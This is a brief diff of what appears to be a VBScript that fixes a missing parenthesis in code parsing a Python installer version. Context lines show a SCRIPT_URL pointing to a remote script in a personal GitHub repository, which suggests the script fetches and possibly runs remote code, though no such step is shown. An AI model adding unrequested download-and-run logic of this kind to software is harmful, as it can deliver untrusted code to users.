@@ -10,7 +10,7 @@ SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/head
 ' Extract Python version from the URL (e.g., "3.11.7" → "311")
 Dim versionParts, majorMinor
 versionParts = Split(PYTHON_URL, "/")
-PYTHON_VERSION = versionParts(UBound(versionParts) ' e.g., "python-3.11.7-amd64.exe"
+PYTHON_VERSION = versionParts(UBound(versionParts)) ' e.g., "python-3.11.7-amd64.exe"
 majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1) ' e.g., "3.11.7"
 majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "") ' e.g., "311"
 
